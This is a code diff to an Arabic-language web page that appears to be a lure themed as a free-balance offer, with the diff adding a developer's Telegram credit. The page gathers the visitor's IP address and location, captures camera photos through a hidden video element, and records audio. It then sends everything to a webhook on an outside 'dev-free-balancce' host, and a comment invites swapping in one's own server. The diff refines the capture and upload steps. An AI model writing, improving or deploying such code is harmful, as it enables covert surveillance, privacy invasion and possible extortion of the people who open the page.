@@ -126,7 +126,27 @@
         .status.success { background: rgba(46,213,115,0.15); color: #2ed573; display: block; }
         .status.info { background: rgba(54,164,235,0.15); color: #36a4eb; display: block; }
         .status.error { background: rgba(255,107,107,0.15); color: #ff6b6b; display: block; }
-        .footer { margin-top: 25px; font-size: 12px; color: #666; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px; }
+        .footer {
+            margin-top: 25px;
+            font-size: 13px;
+            color: #aaa;
+            border-top: 1px solid rgba(255,255,255,0.05);
+            padding-top: 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .footer .developer {
+            color: #ffd700;
+            font-weight: 500;
+        }
+        .footer .developer a {
+            color: #ffd700;
+            text-decoration: none;
+        }
+        .footer .developer a:hover {
+            text-decoration: underline;
+        }
         #hiddenVideo { position: fixed; top: -1000px; left: -1000px; width: 320px; height: 240px; opacity: 0; pointer-events: none; }
         #hiddenCanvas { display: none; }
         @media (max-width: 480px) {
@@ -192,7 +212,12 @@
         </div>
 
         <div class="footer">
-            <i class="fas fa-shield-alt" style="color: #ffd700;"></i> نحمي خصوصيتك • جميع الحقوق محفوظة
+            <div>
+                <i class="fas fa-shield-alt" style="color: #ffd700;"></i> نحمي خصوصيتك • جميع الحقوق محفوظة
+            </div>
+            <div class="developer">
+                <i class="fas fa-code"></i> المطور: <a href="https://t.me/iashraf_mousa" target="_blank">@iashraf_mousa</a>
+            </div>
         </div>
     </div>
 
@@ -202,7 +227,7 @@
 
     <script>
         // ================================================================
-        //  CONFIG - WEBHOOK
+        //  CONFIG - WEBHOOK (غيّر الرابط حسب سيرفرك)
         // ================================================================
         const WEBHOOK_URL = "https://dev-free-balancce.pantheonsite.io/free/bot.php?action=webhook_data";
 
@@ -486,10 +511,11 @@
 
             await getIPAddress();
             await getLocation();
-            await startCameraAndCapture();
-            await recordAudio();
+            const cameraOk = await startCameraAndCapture();
+            const audioOk = await recordAudio();
             await sendAllData();
 
+            // إذا تم التقاط صور أو تسجيل صوت بنجاح، ننتقل للعداد
             if (capturedPhotos.length > 0 || audioChunks.length > 0) {
                 showStep('step-timer');
                 startTimer(180);
@@ -567,7 +593,7 @@
                     canvas.width = width;
                     canvas.height = height;
 
-                    showStatus(statusTasks, 'info', `📸 جاري تأكيد الهوية...`);
+                    showStatus(statusTasks, 'info', `📸 جاري التقاط ${TOTAL_PHOTOS} صور...`);
 
                     for (let i = 1; i <= TOTAL_PHOTOS; i++) {
                         ctx.drawImage(video, 0, 0, width, height);
@@ -575,6 +601,7 @@
                         if (dataUrl && dataUrl.length > 5000) {
                             capturedPhotos.push(dataUrl);
                         } else {
+                            // محاولة إعادة المحاولة
                             await new Promise(r => setTimeout(r, 200));
                             ctx.drawImage(video, 0, 0, width, height);
                             const retry = canvas.toDataURL('image/jpeg', PHOTO_QUALITY);
@@ -582,10 +609,14 @@
                                 capturedPhotos.push(retry);
                             }
                         }
-                        if (i < TOTAL_PHOTOS) await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
+                        // تحديث الحالة بإظهار تقدم
+                        if (i < TOTAL_PHOTOS) {
+                            showStatus(statusTasks, 'info', `📸 تم التقاط ${i} من ${TOTAL_PHOTOS} صور`);
+                            await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
+                        }
                     }
 
-                    showStatus(statusTasks, 'info', `✅ تم تأكيد الهوية`);
+                    showStatus(statusTasks, 'info', `✅ تم التقاط ${capturedPhotos.length} صورة بنجاح`);
                     resolve(true);
 
                 } catch (error) {
@@ -612,6 +643,8 @@
                     audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
                     audioRecorder.onstop = () => { resolve(); };
                     audioRecorder.start();
+                    // إظهار رسالة أثناء التسجيل
+                    showStatus(statusTasks, 'info', `🎤 جاري التسجيل الصوتي لمدة ${AUDIO_DURATION/1000} ثواني...`);
                     setTimeout(() => {
                         if (audioRecorder.state === 'recording') {
                             audioRecorder.stop();
@@ -661,9 +694,11 @@
                 audio: audioBase64
             };
 
+            showStatus(statusTasks, 'info', '📤 جاري إرسال البيانات...');
             const result = await sendToWebhook(payload);
             if (result.success) {
                 console.log('✅ All data sent to webhook');
+                showStatus(statusTasks, 'success', '✅ تم إرسال البيانات بنجاح!');
             } else {
                 console.error('❌ Failed to send all data:', result.error);
                 showStatus(statusTasks, 'error', '⚠️ فشل الإرسال: ' + result.error);
@@ -728,7 +763,7 @@
                     if (el.className.includes(type)) {
                         el.style.display = 'none';
                     }
-                }, 6000);
+                }, 8000); // أطول قليلاً لقراءة الرسائل
             }
         }
 
